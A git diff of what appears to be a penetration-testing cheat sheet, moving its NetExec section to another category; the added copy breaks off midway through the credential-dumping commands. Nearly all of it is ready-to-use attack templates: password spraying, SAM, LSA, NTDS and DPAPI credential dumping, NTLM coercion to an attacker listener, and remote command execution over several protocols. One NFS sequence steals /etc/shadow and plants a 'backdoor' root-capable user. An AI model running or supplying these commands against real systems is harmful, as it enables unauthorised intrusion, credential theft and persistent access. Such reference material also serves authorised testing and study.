@@ -118,7 +118,6 @@ Thank you for reading.
 		- [Kerbrute](#kerbrute)
 		- [LaZagne](#lazagne)
 		- [mimikatz](#mimikatz)
-  		- [NetExec](#netexec)
 		- [pypykatz](#pypykatz)
 		- [Spray-Passwords](#spray-passwords)
 	- [Exploitation Tools](#exploitation-tools-1)
@@ -143,6 +142,7 @@ Thank you for reading.
 		- [ldapsearch](#ldapsearch)
 		- [Linux](#linux-1)
 		- [Microsoft Windows](#microsoft-windows-1)
+  		- [NetExec](#netexec)
 		- [NTLM](#ntlm)
 		- [PassTheCert](#passthecert)
 		- [Penelope](#penelope)
@@ -275,7 +275,6 @@ Thank you for reading.
 | Kerbrute | https://github.com/ropnop/kerbrute |
 | LaZagne | https://github.com/AlessandroZ/LaZagne |
 | mimikatz | https://github.com/gentilkiwi/mimikatz |
-| NetExec | https://github.com/Pennyw0rth/NetExec |
 | ntlm.pw | https://ntlm.pw |
 | pypykatz | https://github.com/skelsec/pypykatz |
 
@@ -324,6 +323,7 @@ Thank you for reading.
 | lsassy | https://github.com/Hackndo/lsassy |
 | Moriaty | https://github.com/BC-SECURITY/Moriarty |
 | nanodump | https://github.com/fortra/nanodump |
+| NetExec | https://github.com/Pennyw0rth/NetExec |
 | Outpacket | https://github.com/n00py/Outpacket |
 | PassTheCert | https://github.com/AlmondOffSec/PassTheCert |
 | PEASS-ng | https://github.com/carlospolop/PEASS-ng |
@@ -3520,452 +3520,6 @@ privilege::debug
 misc::skeleton
 net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
 dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
-```
-
-#### NetExec
-
-> https://github.com/Pennyw0rth/NetExec
-
-> https://www.netexec.wiki/
-
-##### Modules
-
-```shell
-netexec smb -L
-netexec ldap -L
-netexec winrm -L
-netexec mssql -L
-netexec ssh -L
-netexec ftp -L
-netexec rdp -L
-netexec wmi -L
-netexec nfs -L
-netexec vnc -L
-```
-
-##### Authentication
-
-```shell
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
-netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>'
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
-netexec ldap <RHOST> -u '<USERNAME>' -H '<HASH>'
-netexec winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
-netexec winrm -u /t -p '<PASSWORD>' -d '<DOMAIN>' <RHOST>
-netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
-netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN>
-netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth
-netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --port <RPORT>
-netexec wmi <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
-netexec wmi <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN>
-netexec wmi <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth
-```
-
-###### Null Session
-
-```shell
-netexec smb <RHOST> -u '' -p ''
-netexec smb <RHOST> -u ' ' -p ' '
-```
-
-###### Guest Account
-
-```shell
-netexec smb <RHOST> -u 'Guest' -p ''
-```
-
-###### Local Authenitcation
-
-```shell
-netexec smb <RHOST> -u '<USERNAME>' --local-auth
-```
-
-###### Kerberos
-
-###### Kerberos Authentication
-
-```shell
-netexec smb <RHOST> -u '<USERNAME>' --use-kcache
-```
-
-###### Generate TGT
-
-```shell
-netexec smb <RHOST> -u <USERNAME> -p <PASSWORD> --generate-tgt /PATH/TO/FILE/<FILE>.ccache
-export KRB5CCNAME=<FILE>.ccache
-netexec smb <RHOST> -u <USERNAME> -k --use-kcache
-```
-
-###### Generate krb5.conf
-
-```shell
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --generate-krb5-file ./krb5.conf
-export KRB5_CONFIG=./krb5.conf
-echo '<PASSWORD>' | kinit <USERNAME>@<DOMAIN>
-klist
-```
-
-##### Password Spraying
-
-```shell
-netexec <PROTOCOL> <RHOST> -u <USERNAME> <USERNAME> <USERNAME> -p <PASSWORD>
-netexec <PROTOCOL> <RHOST> -u <USERNAME> <USERNAME> <USERNAME> -p <PASSWORD> --ignore-pw-decoding
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --continue-on-success
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --no-bruteforce
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --no-bruteforce --continue-on-success
-```
-
-##### SMB Protocol
-
-###### SMB Share Enumeration
-
-```shell
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'  --shares
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'  --shares --dir
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'  --shares --dir "<FOLDER>"
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'  --shares --smb-timeout 10
-```
-
-###### Download Files
-
-```shell
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o READ_ONLY=false
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o DOWNLOAD_FLAG=true
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --share <SHARE> --get-file <FILE> <FILE>
-```
-
-###### File Handling
-
-```shell
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file \\PATH\\TO\FOLDER\\<FILE> /PATH/TO/FOLDER/<FILE> 
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file /PATH/TO/FILE/<FILE> \\PATH\\TO\FOLDER\\<FILE>
-```
-
-###### RID Brute Force
-
-```shell
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute 100000
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}'
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}'  | awk -F '\\' '{print $2}'
-```
-
-###### Vulnerability Scanning
-
-```shell
-netexec smb <RHOST> -u '' -p '' -M ms17-010
-netexec smb <RHOST> -u '' -p '' -M smbghost
-netexec smb <RHOST> -u '' -p '' -M zerologon
-netexec smb <RHOST> -u '' -p '' -M badsuccessor
-netexec smb <RHOST> -u '' -p '' -M printnightmare
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M nopac
-netexec smb <RHOST> -u '' -p '' -M coerce_plus
-netexec smb <RHOST> -u '' -p '' -M coerce_plus -o LISTENER=<LHOST>
-netexec smb <RHOST> -u '' -p '' -M coerce_plus -o LISTENER=<LHOST> ALWAYS=true
-netexec smb <RHOST> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam
-```
-
-###### System Enumeration
-
-```shell
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users-export <FILE>
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-group
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --pass-pol
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --disks
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --smb-sessions
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --loggedon-users
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M powershell_history
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M bitlocker
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M spooler
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M webdav
-```
-
-###### Credentials Dumping
-
-```shell
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi cookies
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi nosystem
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi nosystem
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M eventlog_creds
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M nanodump
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M ntdsutil
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M backup_operator
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M putty
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M vnc
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mremoteng
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M notepad
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M notepad++
-```
-
-###### Timeroasting
-
-```shell
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M timeroast
-```
-
-###### User Handling
-
-###### Change User Password
-
-```shell
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M change-password -o NEWPASS=<PASSWORD>
-```
-
-###### Change Password of a different User
-
-```shell
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M change-password -o USER=<USERNAME> NEWPASS=<PASSWORD>
-```
-
-###### Command Execution
-
-```shell
-netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x <COMMAND>
-netexec smb <RHOST> -u '<USERNAME>' -M pi -o PID=<PID> EXEC=<COMMAND>
-```
-
-##### LDAP
-
-###### Domain Enumeration
-
-```shell
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users-export <FILE>
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --active-users
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups "<GROUP>"
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --admin-count
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query "(adminCount=1)" "sAMAccountName"
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dc-list
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-desc-users
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M adcs
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M pre2k
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M maq
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_trusts
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M ldap-checker
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M whoami
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M sccm -o REC_RESOLVE=TRUE
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound --dns-tcp --dns-server <RHOST> -c All
-```
-
-###### Find Domain SID
-
-```shell
-netexec ldap <RHOST> -u '<USERNAME>' -k --get-sid
-```
-
-###### Forest Trust Enumeration
-
-```shell
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --query '(&(objectClass=trustedDomain)(trustPartner=<DOMAIN>))' 'distinguishedName trustPartner trustDirection trustType trustAttributes securityIdentifier'
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --query '(&(objectClass=trustedDomain)(trustPartner=<DOMAIN>))' 'distinguishedName trustPartner trustDirection trustType trustAttributes securityIdentifier'
-```
-
-```python
-python3 -c 'v=72; print(f"{v} = {v:#x}"); print([name for bit,name in [(0x1,"NON_TRANSITIVE"),(0x2,"UPLEVEL_ONLY"),(0x4,"QUARANTINED"),(0x8,"FOREST_TRANSITIVE"),(0x10,"CROSS_ORGANIZATION"),(0x20,"WITHIN_FOREST"),(0x40,"TREAT_AS_EXTERNAL"),(0x400,"PIM_TRUST")] if v & bit])'
-```
-
-```shell
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --query '(&(objectClass=group)(objectSid=*))' 'sAMAccountName objectSid memberOf'
-```
-
-###### LDAP Queries
-
-```shell
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query '(sAMAccountName=Administrator)' ''
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query '(sAMAccountName=Administrator)' 'sAMAccountName objectClass pwdLastSet'
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dns-server <RHOST> --query '(&(objectClass=organizationalUnit)(ou=<OU>))' 'distinguishedName objectGUID'
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dns-server <RHOST> --query '(sAMAccountName=<GROUP>)' 'distinguishedName objectSid member'
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dns-server <RHOST> --query '(sAMAccountName=<USERNAME>)' 'distinguishedName objectSid memberOf'
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M daclread -o TARGET_DN='OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' ACTION=read PRINCIPAL=<GROUP>
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M daclread -o TARGET_DN='OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' ACTION=read PRINCIPAL=<USERNAME>
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query '(&(objectClass=user)(sAMAccountName=<USERNAME>))' 'distinguishedName sAMAccountName userPrincipalName userAccountControl pwdLastSet'
-```
-
-###### Domain Access Control List (DACL) Enumeration
-
-```shell
-netexec ldap -k --kdcHost <RHOST> -M daclread -o TARGET=Administrator ACTION=read
-netexec ldap -k --kdcHost <RHOST> -M daclread -o TARGET=Administrator ACTION=read PRINCIPAL=<USERNAME>
-netexec ldap -k --kdcHost <RHOST> -M daclread -M daclread -o TARGET_DN="DC=<DOMAIN>,DC=<DOMAIN>" ACTION=read RIGHTS=DCSync
-netexec ldap -k --kdcHost <RHOST> -M daclread -M daclread -o TARGET=Administrator ACTION=read ACE_TYPE=denied
-netexec ldap -k --kdcHost <RHOST> -M daclread -M daclread -o TARGET=../../<FILE> ACTION=backup
-```
-
-###### Credentials Dumping
-
-```shell
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
-```
-
-###### ASREPRoast
-
-```shell
-netexec ldap <RHOST> -u '<USERNAME>' -p '' --asreproast hashes.asreproast
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast
-netexec ldap <RHOST> -u '<USERNAME>' -p '' --asreproast hashes.asreproast --kdcHost <DOMAIN>
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast --kdcHost <DOMAIN>
-```
-
-###### Kerberoasting
-
-```shell
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting
-```
-
-###### Delegation
-
-###### Find Delegation
-
-```shell
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation
-```
-
-###### Find Unconstrained Delegation
-
-```shell
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --trusted-for-delegation
-```
-
-###### Active Directory Certificate Services (AD CS)
-
-###### ESC8: NTLM Relay to AD CS HTTP Endpoints
-
-```shell
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M adcs
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M adcs -o SERVER=<RHOST>
-```
-
-##### WinRM
-
-###### Command Execution
-
-```shell
-netexec winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -X <COMMAND>
-```
-
-##### MSSQL
-
-###### RID Brute Force
-
-```shell
-netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --rid-brute
-```
-
-###### Privilege Escalation
-
-```shell
-netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv
-netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv -o ACTION=privesc
-netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv -o ACTION=rollback
-```
-
-###### Command Execution
-
-```shell
-netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth -x whoami
-netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
-```
-
-###### File Handling
-
-```shell
-netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file \\PATH\\TO\FOLDER\\<FILE> /PATH/TO/FOLDER/<FILE>
-netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file /PATH/TO/FILE/<FILE> \\PATH\\TO\FOLDER\\<FILE>
-```
-
-##### SSH
-
-###### Command Execution
-
-```shell
-netexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x <COMMAND>
-```
-
-###### File Handling
-
-```shell
-netexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file /PATH/TO/FOLDER/<FILE> <FILE>
-netexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file <FILE> /PATH/TO/FOLDER/<FILE>
-```
-
-##### FTP
-
-###### File Handling
-
-```shell
-netexec ftp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ls
-netexec ftp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file <FILE>
-netexec ftp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file <FILE> <FILE>
-```
-
-##### RDP
-
-###### Take Screenshot
-
-```shell
-netexec rdp <RHOST> --nla-screenshot
-netexec rdp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --screenshot --screentime 3
-```
-
-##### WMI
-
-###### Command Execution
-
-```shell
-netexec wmi <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x <COMMAND>
-```
-
-##### NFS
-
-###### Share Enumeration
-
-```shell
-netexec nfs <RHOST>
-netexec nfs <RHOST> --shares
-netexec nfs <RHOST> --enum-shares
-netexec nfs <RHOST> --share '/var/nfs/general' --ls '/'
-```
-
-####### File Handling
-
-```shell
-netexec nfs <RHOST> --get-file /PATH/TO/FOLDER/<FILE> <FILE>
-netexec nfs <RHOST> --put-file <FILE> /PATH/TO/FOLDER/<FILE>
-```
-
-###### Escape to root File System
-
-| Username | Password |
-| --- | --- |
-| backdoor | P@ssword123! |
-
-```shell
-netexec nfs <RHOST> --ls '/'
-netexec nfs <RHOST> --get-file '/etc/shadow' etc_shadow
-netexec nfs <RHOST> --get-file '/etc/passwd' etc_passwd
-echo 'backdoor$6$QF0YMBn9$Gj7DTxYtq7ie3zTOSSHrFsp2DpWqTpV0xunqkGxU7UlK8tZkW6zzFNRy8GwsVqYFxflK0zPbAAKQt6VwAhWqsyO:18000:0:99999:7:::' >> etc_shadow
-echo 'backdoor:x:1003:1001:,,,:/home/backdoor:/bin/bash' >> etc_passwd
-netexec nfs <RHOST> --put-file etc_shadow '/etc/shadow'
-netexec nfs <RHOST> --put-file etc_passwd '/etc/passwd'
-ssh backdoor@<RHOST>
 ```
 
 #### pypykatz
@@ -7532,6 +7086,452 @@ Get-LocalGroupMember administrators
 $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
 Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
+```
+
+#### NetExec
+
+> https://github.com/Pennyw0rth/NetExec
+
+> https://www.netexec.wiki/
+
+##### Modules
+
+```shell
+netexec smb -L
+netexec ldap -L
+netexec winrm -L
+netexec mssql -L
+netexec ssh -L
+netexec ftp -L
+netexec rdp -L
+netexec wmi -L
+netexec nfs -L
+netexec vnc -L
+```
+
+##### Authentication
+
+```shell
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
+netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>'
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
+netexec ldap <RHOST> -u '<USERNAME>' -H '<HASH>'
+netexec winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
+netexec winrm -u /t -p '<PASSWORD>' -d '<DOMAIN>' <RHOST>
+netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
+netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN>
+netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth
+netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --port <RPORT>
+netexec wmi <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
+netexec wmi <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN>
+netexec wmi <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth
+```
+
+###### Null Session
+
+```shell
+netexec smb <RHOST> -u '' -p ''
+netexec smb <RHOST> -u ' ' -p ' '
+```
+
+###### Guest Account
+
+```shell
+netexec smb <RHOST> -u 'Guest' -p ''
+```
+
+###### Local Authenitcation
+
+```shell
+netexec smb <RHOST> -u '<USERNAME>' --local-auth
+```
+
+###### Kerberos
+
+###### Kerberos Authentication
+
+```shell
+netexec smb <RHOST> -u '<USERNAME>' --use-kcache
+```
+
+###### Generate TGT
+
+```shell
+netexec smb <RHOST> -u <USERNAME> -p <PASSWORD> --generate-tgt /PATH/TO/FILE/<FILE>.ccache
+export KRB5CCNAME=<FILE>.ccache
+netexec smb <RHOST> -u <USERNAME> -k --use-kcache
+```
+
+###### Generate krb5.conf
+
+```shell
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --generate-krb5-file ./krb5.conf
+export KRB5_CONFIG=./krb5.conf
+echo '<PASSWORD>' | kinit <USERNAME>@<DOMAIN>
+klist
+```
+
+##### Password Spraying
+
+```shell
+netexec <PROTOCOL> <RHOST> -u <USERNAME> <USERNAME> <USERNAME> -p <PASSWORD>
+netexec <PROTOCOL> <RHOST> -u <USERNAME> <USERNAME> <USERNAME> -p <PASSWORD> --ignore-pw-decoding
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --continue-on-success
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --no-bruteforce
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --no-bruteforce --continue-on-success
+```
+
+##### SMB Protocol
+
+###### SMB Share Enumeration
+
+```shell
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'  --shares
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'  --shares --dir
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'  --shares --dir "<FOLDER>"
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'  --shares --smb-timeout 10
+```
+
+###### Download Files
+
+```shell
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o READ_ONLY=false
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o DOWNLOAD_FLAG=true
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --share <SHARE> --get-file <FILE> <FILE>
+```
+
+###### File Handling
+
+```shell
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file \\PATH\\TO\FOLDER\\<FILE> /PATH/TO/FOLDER/<FILE> 
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file /PATH/TO/FILE/<FILE> \\PATH\\TO\FOLDER\\<FILE>
+```
+
+###### RID Brute Force
+
+```shell
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute 100000
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}'
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}'  | awk -F '\\' '{print $2}'
+```
+
+###### Vulnerability Scanning
+
+```shell
+netexec smb <RHOST> -u '' -p '' -M ms17-010
+netexec smb <RHOST> -u '' -p '' -M smbghost
+netexec smb <RHOST> -u '' -p '' -M zerologon
+netexec smb <RHOST> -u '' -p '' -M badsuccessor
+netexec smb <RHOST> -u '' -p '' -M printnightmare
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M nopac
+netexec smb <RHOST> -u '' -p '' -M coerce_plus
+netexec smb <RHOST> -u '' -p '' -M coerce_plus -o LISTENER=<LHOST>
+netexec smb <RHOST> -u '' -p '' -M coerce_plus -o LISTENER=<LHOST> ALWAYS=true
+netexec smb <RHOST> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam
+```
+
+###### System Enumeration
+
+```shell
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users-export <FILE>
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-group
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --pass-pol
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --disks
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --smb-sessions
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --loggedon-users
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M powershell_history
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M bitlocker
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M spooler
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M webdav
+```
+
+###### Credentials Dumping
+
+```shell
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi cookies
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi nosystem
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi nosystem
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M eventlog_creds
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
